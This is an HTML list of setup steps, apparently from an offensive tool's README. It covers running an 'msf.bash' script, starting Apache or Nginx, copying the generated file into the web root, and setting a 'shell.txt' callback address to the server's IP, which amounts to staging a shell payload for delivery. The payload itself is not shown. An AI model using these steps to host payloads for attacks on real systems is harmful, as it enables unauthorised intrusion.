<ol>
        <li>Run the provided `msf.bash` script:</li>
        <pre><code>./msf.bash</code></pre>

        <li>Start your Apache or Nginx web server.</li>
        <p>Choose one of the following commands based on your web server:</p>
        <p>For Apache:</p>
        <pre><code>sudo systemctl start apache2</code></pre>
        <p>For Nginx:</p>
        <pre><code>sudo systemctl start nginx</code></pre>

        <li>Upload the file created by `msf.bash` to your web server's root directory (usually `/var/www/html`). You can use tools like `mv` to move the file:</li>
        <pre><code>mv path/to/msf-created-file /var/www/html/</code></pre>

        <li>Once the file is in the `/var/www/html/` directory, locate and open the `shell.txt` file:</li>
        <pre><code>sudo nano /var/www/html/shell.txt</code></pre>

        <li>Edit the `CH_me` in `shell.txt` with your Apache or Nginx server's IP address.</li>
        <p>Replace `CH_me` with the IP address of your server, e.g.,</p>
        <pre><code>CH_me=http://your_apache_or_nginx_ip/</code></pre>
</ol>
